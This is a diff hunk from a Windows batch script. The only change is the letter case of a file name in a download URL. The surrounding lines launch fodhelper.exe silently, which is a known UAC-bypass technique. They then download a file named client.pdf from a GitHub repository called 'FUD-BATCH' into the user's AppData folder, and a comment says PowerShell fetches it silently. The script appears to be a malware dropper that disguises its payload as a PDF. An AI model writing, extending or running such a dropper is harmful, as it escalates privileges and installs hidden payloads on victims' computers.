@@ -37,7 +37,7 @@ start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1
 timeout /t 10 /nobreak >nul 2>&1
 
 :: Set the download URL and the target path for Client.pdf
-set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
+set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/client.pdf"
 set "output2=C:\Users\%USERNAME%\AppData\Local\client.pdf"
 
 :: Download the Client.pdf file using PowerShell silently
